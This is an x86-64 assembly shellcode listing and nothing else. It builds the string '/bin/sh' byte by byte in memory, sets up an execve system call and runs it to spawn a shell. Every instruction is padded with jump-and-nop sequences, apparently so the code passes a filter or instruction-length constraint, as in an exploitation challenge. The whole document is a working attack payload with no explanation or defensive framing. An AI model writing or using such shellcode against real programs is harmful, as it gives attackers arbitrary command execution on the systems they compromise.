BITS 64
section .code

push rdi
pop rdx
jmp $+6

;set rdx to rdx
xor esi,esi
jmp $+6
;//set esi 0
push 0x3b
jmp $+6
pop rax;
nop
jmp $+6
;main cycle!!!
push  0x2f;0x68732f6e69622f
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;// 1
push  0x62;0x68732f6e6962
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//2
push  0x69;0x68732f6e69
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//3
push  0x6e;0x68732f6e
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//4
push  0x2f;0x68732f
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//5
push  0x73;0x6873
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//66
push  0x68;0x68
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//7
push  0x0;0x68732f
jmp $+6
pop rbx
nop 
jmp $+6
mov [rdx],bl
jmp $+6
inc dl
jmp $+6
;//8
;//set edx zero and create syscall
xor edx,edx
jmp $+6
syscall
jmp $+6
